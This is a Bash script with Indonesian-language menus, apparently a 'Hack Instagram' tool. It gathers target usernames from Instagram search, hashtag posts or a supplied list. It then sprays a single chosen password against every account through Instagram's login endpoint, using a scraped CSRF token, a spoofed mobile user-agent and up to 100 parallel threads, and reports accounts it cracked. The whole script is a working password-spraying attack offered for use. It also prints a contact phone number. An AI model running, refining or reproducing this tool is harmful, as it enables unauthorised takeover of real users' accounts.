GatorBks() {
#!/bin/bash
 

clear


#Author By ǴaͲor βks


#Color Text By ǴaͲor βks
#\e[(efek);(warna)m
#Efek Warna Default = 1
#Efek Warna Gelap = 2
#Efek Warna Gelap + Italic(i) = 3
#Efek Underline(u) = 4
#Efek Background Text(b) (Urutan Warna Sama) = 40-48
w_default="\e[0m"
grey="\e[1;30m"
black="\e[2;30m"
grey_b="\e[40;30m" 
red="\e[1;31m"
dark_red="\e[2;31m"
red_i="\e[3;31m"
red_u="\e[4;31m"
red_b="\e[41;31m"
green="\e[1;32m"
dark_green="\e[2;32m"
green_i="\e[3;32m"
green_u="\e[4;32m"
green_b="\e[42;32m"
yellow="\e[1;33m"
dark_yellow="\e[2;33m"
gold_i="\e[3;33m"
yellow_u="\e[4;33m"
gold_b="\e[43;33m"
blue="\e[1;34m"
dark_blue="\e[2;34m"
blue_i="\e[3;34m"
blue_u="\e[4;34m"
blue_b="\e[44;34m"
magenta="\e[1;35m"
dark_magenta="\e[2;35m"
magenta_i="\e[3;35m"
magenta_u="\e[4;35m"
magenta_b="\e[45;35m"
cyan="\e[1;36m"
teal="\e[2;36m"
cyan_i="\e[3;36m"
cyan_u="\e[4;36m"
cyan_b="\e[46;36m"
white="\e[1;37m"
dark_white="\e[2;37m"
white_i="\e[3;37m"
white_u="\e[4;37m"
silver_b="\e[47;37m"
snow="\e[1;38m"
silver="\e[2;38m"
snow_i="\e[3;38m"
snow_u="\e[4;38m"
snow_b="\e[48;38m"


#Author By ǴaͲor βks
Author="$green[\e[1;33m+$green]$yellow Author By ǴaͲor βks"
Thanks="$green[\e[1;33m+$green]$cyan Terima Kasih Telah Menggunakan Tools Ini ●‿○"
Wrongs="$green[\e[1;33m+$green]$red Harap Masukkan Pilihan Dengan Benar!!!"


# Banner
NFZ () {
	echo -e "$red	╔╦═╦╗╔═╗╔╗─╔═╗╔═╗╔═╦═╗╔═╗ ╔══╗╔═╗"
	echo -e "	║║║║║║╦╝║║─║╔╝║║║║║║║║║╦╝ ╚╗╔╝║║║"
	echo -e "$white	║║║║║║╩╗║╚╗║╚╗║║║║║║║║║╩╗ ─║║─║║║"
	echo -e "	╚═╩═╝╚═╝╚═╝╚═╝╚═╝╚╩═╩╝╚═╝ ─╚╝─╚═╝"
	echo -e "$cyan╔══╗╔══╗╔══╗╔═╗╔═╗ ╔══╗╔╦╗╔══╗ ╔══╗╔═╗╔═╗╔╗─╔══╗"
	echo -e "║╔═╣║╔╗║╚╗╔╝║║║║╬║ ║╔╗║║╔╝║══╣ ╚╗╔╝║║║║║║║║─║══╣"
	echo -e "$blue║╚╗║║╠╣║─║║─║║║║╗╣ ║╔╗║║╚╗╠══║ ─║║─║║║║║║║╚╗╠══║"
	echo -e "╚══╝╚╝╚╝─╚╝─╚═╝╚╩╝ ╚══╝╚╩╝╚══╝ ─╚╝─╚═╝╚═╝╚═╝╚══╝"
	echo -e "$yellow		   🄷🄰🄲🄺 🄸🄽🅂🅃🄰🄶🅁🄰🄼"
	echo -e "$green●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●" 
	echo -e "$white • Gunakan Tools Ini Dengan Bijak!"
	echo -e " • Dilarang Memperjual Belikan Tools Ini Tanpa"
	echo -e "   Seizin Saya!!"
	echo -e " • Dilarang Keras Untuk Recode Tools Ini Tanpa"
	echo -e "   Seizin Saya!!"
	echo -e " • For Credit/Bug Chat WA : 081310662343"
	echo -e "$green●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●" 
	echo -e "$w_default"
	Menu
}


# Menu
Menu() {
	echo -e "$red[\e[1;37m1$red]$yellow DAPATKAN TARGET DARI SPESIFIK \e[1;31m@username"
	echo -e "$red[\e[1;37m2$red]$yellow DAPATKAN TARGET DARI SPESIFIK \e[1;31m#hashtag"
	echo -e "$red[\e[1;37m3$red]$yellow CRACK DARI DAFTAR TARGET ANDA"
	echo -e "\n"
	echo -e -n "$red[\e[1;33m+$red]$green Masukkan Pilihan $yellow=>$white "
	read opt
	echo -e "$w_default"

	touch target
	Start_Menu
}


# Start Menu
Start_Menu() {
# Dependencies
dependencies=( "jq" "curl" )
for i in "${dependencies[@]}"
do
command -v $i >/dev/null 2>&1 || {
echo >&2 "$i : not installed - install by typing the command : apl install $i -y"
exit
}
done


# Dependencies
dependencies=( "jq" "curl" )
for i in "${dependencies[@]}"
do
    command -v $i >/dev/null 2>&1 || {
        echo >&2 "$i : not installed - install by typing the command : apt install $i -y"
        exit
    }
done


case $opt in
	1) #menu 1
		echo -e "\n"
		echo -n -e "$cyan[\e[1;33m+$cyan]$yellow Nama Pengguna $red=>$green "
		read ask
		collect=$(curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${ask}" | jq -r '.users[].user.username' > target)
		echo -e "$cyan[\e[1;33m+$cyan]$yellow Jumlah Yang Ditemukan $red=>$green "$collect''$(< target wc -l ; echo -e "${white}user")
		echo -n -e "$cyan[\e[1;33m+$cyan]$yellow Password Yang Digunakan $red=>$green "
		read pass
		echo -e "$red[\e[1;33m+$red]$red Start cracking...$w_default"
		Start_Brute
		;;
	2) #menu 2
		echo -e "\n"
		echo -n -e "$cyan[\e[1;33m+$cyan]$yellow Tag Yang Digunakan $red=>$green "
		read hashtag
		get=$(curl -sX GET "https://www.instagram.com/explore/tags/${hashtag}/?__a=1")
		if [[ $get =~ "Halaman Tidak Ditemukan" ]]; then
			echo -e "$hashtag : $red[\e[1;33m+$red]$red Hashtag Tidak Ditemukan${white}"
			exit
		else
			echo "$get" | jq -r '.[].hashtag.edge_hashtag_to_media.edges[].node.shortcode' | awk '{print "https://www.instagram.com/p/"$0"/"}' > result
			echo -e "$cyan[\e[1;33m+$cyan]$yellow Menghapus Pengguna Duplikat Dari Tag ${red}#$hashtag${white}"$(sort -u result > hashtag)
			echo -e "$cyan[\e[1;33m+$cyan]$yellow Jumlah Yang Ditemukan $red=>$green "$(< hashtag wc -l ; echo -e "${white}user")
			echo -n -e "$cyan[\e[1;33m+$cyan]$yellow Password Yang Digunakan $red=>$green "
			read pass
			echo -e "$red[\e[1;33m+$red]$red Start cracking...$w_default"
			for tag in $(cat hashtag); do
				echo $tag | xargs -P 100 curl -s | grep -o "alternateName.*" | cut -d "@" -f2 | cut -d '"' -f1 >> target &
            done
            wait
			rm hashtag result
			Start_Brute
		fi
		;;
	3) #menu 3
		echo -e "\n"
		echo -n -e "$cyan[\e[1;33m+$cyan]$yellow Nama List $red=>$green "
		read list
		if [[ ! -e $list ]]; then
			echo -e "$cyan[\e[1;33m+$cyan]$yellow File Tidak Ditemukan ;("
			exit
		else
			cat $list > target
			echo -e "$cyan[\e[1;33m+$cyan]$yellow Jumlah Yang Ditemukan $red=>$green "$(< target wc -l)
			echo -n -e "$cyan[\e[1;33m+$cyan]$yellow Password Yang Digunakan $red=>$green "
			read pass
			echo -e "$red[\e[1;33m+$red]$red Start cracking...$w_default"
			Start_Brute
		fi
		;;
	*) #wrong menu
		echo -e "\n"
		echo -e "$Wrongs"
		sleep 3
		clear
		echo -e "\n"
		echo -e "$Author"
		echo -e "$Thanks"
		echo -e "$w_default"
		sleep 5
		clear
		GatorBks
		;;
esac
}


# Start Brute
Start_Brute() {
token=$(curl -sLi "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.*" | cut -d "=" -f2 | cut -d ";" -f1)
Brute() {
url=$(curl -s -c cookie.txt -X POST "https://www.instagram.com/accounts/login/ajax/" \
-H "cookie: csrftoken=${token}" \
-H "origin: https://www.instagram.com" \
-H "referer: https://www.instagram.com/accounts/login/" \
-H "user-agent: Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.0.3.2" \
-H "x-csrftoken: ${token}" \
-H "x-requested-with: XMLHttpRequest" \
-d "username=${i}&password=${pass}")
login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
if [[ $login =~ "true" ]]; then
echo -e "[${green}+${white}] ${yellow}You get it! ${blue}[${white}@$i - $pass${blue}] ${white}- with: "$(curl -s "https://www.instagram.com/$i/" | grep "<meta content=" | cut -d '"' -f2 | cut -d "," -f1)
elif [[ $login =~ "false" ]]; then
echo -e "[${red}!${white}] @$i - ${red}failed to crack${white}"
elif [[ $url =~ "checkpoint_required" ]]; then
echo -e "[${cyan}?${white}] @$i ${white}: ${green}checkpoint${white}"
fi
}


# Thread Limit 
limit=100
# Thread
(
    for i in $(cat target); do
        ((thread=thread%limit)); ((thread++==0)) && wait
       Brute "$i" &
    done
    wait
)


rm target

echo -e "$w_default"
Balik
}


# Next Level
Balik() {
	echo -e "\n"
	echo -e "$Author"
	echo -e "$Thanks"
	echo -e "$w_default"
	echo -e "\n"
	echo -n -e "$red[\e[1;33m+$red]$yellow Tekan Enter Untuk Memilih Opsi Selanjutnya"
	read text
	echo -e "$w_default"
	Lagi
}


# Ulang
Lagi() {
	clear
	echo -e "\n"
	echo -e "$red[\e[1;37m1$red]$yellow KEMBALI KE PROGRAM HACK INSTAGRAM"
	echo -e "$red[\e[1;37m2$red]$yellow KEMBALI KE AWAL PROGRAM"
	echo -e "$red[\e[1;37m3$red]$red KELUAR"
	echo -e "\n"
	echo -e -n "$red[\e[1;33m+$red]$cyan Masukkan Pilihan $red=>$white "
	read jawab
	echo -e "\n"
	echo -e "$w_default"
	if [ $jawab -eq "1" ]
	then
		clear
		echo -e "\n"
		echo -e "$cyan[\e[1;33m+$cyan]$yellow Sedang Mempersiapkan Tools Harap Tunggu Sebentar..."
		sleep 5
		clear
		echo -e "\n"
		echo -n -e "$red[\e[1;33m+$red]$yellow Tekan Enter Untuk Memilih Opsi Selanjutnya"
		read text
		clear
		echo -e "\n"
		echo -e "$Author"
		echo -e "$Thanks"
		echo -e "$w_default"
		sleep 5
		clear
		GatorBks
	elif [ $jawab -eq "2" ]
	then
		clear
		echo -e "\n"
		echo -e "$cyan[\e[1;33m+$cyan]$yellow Sedang Mempersiapkan Tools Harap Tunggu Sebentar..."
		sleep 10
		clear
		echo -e "\n"
		echo -n -e "$red[\e[1;33m+$red]$yellow Tekan Enter Untuk Memilih Opsi Selanjutnya"
		read text
		clear
		echo -e "\n"
		echo -e "$Author"
		echo -e "$Thanks"
		echo -e "$w_default"
		sleep 5
		clear
		python Run.py
	elif [ $jawab -eq "3" ]
	then
		clear
		echo -e "\n"
		echo -e "$Author"
		echo -e "$Thanks"
		echo -e "$w_default"
		sleep 5
		clear
	else
		clear
		echo -e "\n"
		echo -e "$Wrongs"
		sleep 3
		clear
		echo -e "\n"
		echo -e "$Author"
		echo -e "$Thanks"
		echo -e "$w_default"
		sleep 5
		clear
		Lagi
	fi
}


NFZ
}


GatorBks
